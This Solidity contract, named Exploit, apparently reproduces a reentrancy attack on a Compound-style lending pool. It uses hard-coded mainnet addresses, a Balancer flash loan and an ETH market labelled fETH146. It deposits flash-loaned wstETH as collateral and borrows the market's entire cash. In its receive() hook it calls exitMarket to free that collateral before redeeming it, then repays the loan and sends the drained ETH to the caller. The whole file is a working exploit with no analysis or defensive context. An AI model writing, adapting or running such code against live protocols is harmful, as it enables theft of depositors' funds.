// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;

import "hardhat/console.sol";

interface IERC20 {
    function balanceOf(address) external view;
    function approve(address, uint256) external;
    function transfer(address, uint256) external;
}

interface CToken is IERC20{
    function borrow(uint borrowAmount) external returns (uint256);
    function redeemUnderlying(uint redeemAmount) external returns (uint256);
    function mint(uint mintAmount) external returns (uint256);
    function getCash() external view returns (uint256);
}

interface IWETH is IERC20 {
    function withdraw(uint256) external;    
}

interface IComptroller {
    function enterMarkets(address[] memory cTokens) external returns (uint[] memory);
    function exitMarket(address cTokenAddress) external returns (uint);
}

interface IFlashLoanRecipient {
    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}

interface IBalancerVault {
    function flashLoan(
        IFlashLoanRecipient recipient,
        IERC20[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

contract Exploit is IFlashLoanRecipient {
    
    IERC20 private constant wstETH = IERC20(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0);
    IWETH private constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    CToken private constant wstETHCToken = CToken(0x49dA42a1EcA4AC6cA0C6943d9E5dc64e4641e0E3);
    CToken private constant fETH146 = CToken(0xfbD8Aaf46Ab3C2732FA930e5B343cd67cEA5054C);

    IBalancerVault private constant balancerVault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);

    IComptroller private constant comptroller = IComptroller(0x88F7c23EA6C4C404dA463Bc9aE03b012B32DEf9e);

    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) external override {
        address[] memory tempTokens = new address[](1);
        tempTokens[0] = address(wstETHCToken);
        comptroller.enterMarkets(tempTokens);
        wstETH.approve(address(wstETHCToken), type(uint256).max);
        wstETHCToken.mint(amounts[0]);
        
        uint256 balance = fETH146.getCash();
        fETH146.borrow(balance);
        wstETHCToken.redeemUnderlying(amounts[0]);

        for(uint i = 0; i < tokens.length; i++) {
            tokens[i].transfer(address(balancerVault), amounts[i] + feeAmounts[i]);
        }        
    }

    function execute() external {
        balancerVaultFlashLoan();
    }

    function balancerVaultFlashLoan() private {
        IERC20[] memory tokens = new IERC20[](2);
        tokens[0] = wstETH;
        tokens[1] = WETH;

        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 80000e18;
        amounts[1] = 50000e18;

        balancerVault.flashLoan(
            IFlashLoanRecipient(address(this)),
            tokens,
            amounts,
            ""
        );
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {
        comptroller.exitMarket(address(wstETHCToken));
    }
}